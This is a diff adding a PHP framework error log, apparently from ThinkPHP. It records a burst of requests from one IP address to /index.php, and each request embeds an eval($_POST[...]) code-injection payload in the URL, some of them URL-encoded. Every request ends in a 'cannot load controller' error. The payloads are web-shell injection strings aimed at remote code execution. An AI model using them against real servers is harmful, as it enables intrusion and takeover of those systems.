@@ -1,0 +1,39 @@
+[ 2018-05-04T17:26:18+08:00 ] 27.255.77.11 /index.php/module/action/param1/${@eval($_POST[c])}
+ERR: 无法加载控制器:Module
+
+[ 2018-05-04T17:26:18+08:00 ] 27.255.77.11 /index.php/module/action/param1/${@eval($_POST[c])}
+ERR: 无法加载控制器:Module
+
+[ 2018-05-04T17:26:18+08:00 ] 27.255.77.11 /index.php/module/action/param1/${@eval($_POST[c])}
+ERR: 无法加载控制器:Module
+
+[ 2018-05-04T17:26:18+08:00 ] 27.255.77.11 /index.php/module/action/param1/${@print(eval($_POST[c]))}/utility/convert/data/config.inc.php
+ERR: 无法加载控制器:Module
+
+[ 2018-05-04T17:26:18+08:00 ] 27.255.77.11 /index.php/module/action/param1/${@print(eval($_POST[c]))}
+ERR: 无法加载控制器:Module
+
+[ 2018-05-04T17:26:18+08:00 ] 27.255.77.11 /index.php/module/action/param1/${@print(eval($_POST[c]))}
+ERR: 无法加载控制器:Module
+
+[ 2018-05-04T17:26:18+08:00 ] 27.255.77.11 /index.php/module/action/param1/${@print(eval($_POST[c]))}
+ERR: 无法加载控制器:Module
+
+[ 2018-05-04T17:26:18+08:00 ] 27.255.77.11 /index.php/module/action/param1/{${eval($_POST[thinkphp])}}
+ERR: 无法加载控制器:Module
+
+[ 2018-05-04T17:26:18+08:00 ] 27.255.77.11 /index.php/module/action/param1/{${eval($_POST[thinkphp])}}
+ERR: 无法加载控制器:Module
+
+[ 2018-05-04T17:26:18+08:00 ] 27.255.77.11 /index.php/module/action/param1/{${eval($_POST[thinkphp])}}
+ERR: 无法加载控制器:Module
+
+[ 2018-05-04T17:26:20+08:00 ] 27.255.77.11 /index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D
+ERR: 无法加载控制器:Module
+
+[ 2018-05-04T17:26:20+08:00 ] 27.255.77.11 /index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D
+ERR: 无法加载控制器:Module
+
+[ 2018-05-04T17:26:20+08:00 ] 27.255.77.11 /index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D
+ERR: 无法加载控制器:Module
+
